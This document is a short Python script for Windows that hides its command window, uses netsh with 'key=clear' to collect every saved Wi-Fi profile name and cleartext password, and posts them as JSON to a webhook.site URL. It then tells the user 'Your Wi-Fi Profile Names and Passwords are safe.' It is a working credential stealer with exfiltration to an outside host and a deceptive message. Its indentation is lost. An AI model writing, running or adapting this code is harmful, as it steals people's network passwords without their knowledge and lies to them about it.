import subprocess
import re
import json
import urllib.request
import urllib.error
# Function to run a command and suppress the Command Prompt window
def run_command(command):
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
return subprocess.run(command, capture_output=True, text=True, startupinfo=startupinfo)
# Function to get Wi-Fi profiles
def get_wifi_profiles():
# Get the list of Wi-Fi profiles using 'netsh wlan show profiles'
profiles_output = run_command(["netsh", "wlan", "show", "profiles"])
profiles = [line.split(":")[1].strip() for line in profiles_output.stdout.splitlines() if "All User Profile" in line]
# Create a dictionary to store Wi-Fi profile names and their keys
wifi_data = {}
# Loop through each Wi-Fi profile and extract its name and key
for profile in profiles:
profile_output = run_command(["netsh", "wlan", "show", "profile", "name=" + profile, "key=clear"])
name_match = re.search(r"Name\s+:\s+(.+)", profile_output.stdout)
key_match = re.search(r"Key Content\s+:\s+(.+)", profile_output.stdout)
if name_match and key_match:
profile_name = name_match.group(1)
key_content = key_match.group(1)
wifi_data[profile_name] = key_content
return wifi_data
# Function to send data to webhook
def send_to_webhook(data, webhook_url):
# Define headers and prepare JSON data
headers = {'Content-Type': 'application/json'}
data = json.dumps(data).encode('utf-8')
# Send the JSON data to the webhook using an HTTP request
req = urllib.request.Request(webhook_url, data=data, headers=headers)
try:
with urllib.request.urlopen(req) as response:
print("Your Wi-Fi Profile Names and Passwords are safe.")
except urllib.error.URLError as e:
print("Error sending the request:", e)
if __name__ == "__main__":
# Define the webhook URL (replace with your own)
webhook_url = "https://webhook.site/ae6c8f3b-9d2e-48e7-bdab-9a1e4a38db94"
# Get Wi-Fi profiles and send to webhook
wifi_profiles = get_wifi_profiles()
send_to_webhook(wifi_profiles, webhook_url)